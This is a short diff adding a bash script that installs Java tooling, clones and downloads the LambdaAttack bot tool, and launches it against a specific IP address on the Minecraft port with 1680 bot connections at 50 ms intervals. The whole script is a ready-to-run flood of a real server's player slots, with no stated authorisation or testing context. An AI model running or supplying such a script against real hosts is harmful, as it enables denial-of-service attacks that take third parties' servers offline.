@@ -1,0 +1,14 @@
+#!/bin/bash
+
+sudo apt update
+sudo apt install openjdk-17-jdk maven git -y
+
+if [ ! -d LambdaAttack ]; then
+  git clone https://github.com/TuxCoding/LambdaAttack.git
+fi
+
+cd LambdaAttack || exit
+
+wget -O lambdaattack.jar https://github.com/games647/LambdaAttack/releases/download/2.4.0/lambdaattack-core-2.4.0.jar
+
+java -jar lambdaattack.jar --host 212.22.80.75 --port 25565 --count 1680 --delay 50 --version 1.15.2 -r --name "Check%d"
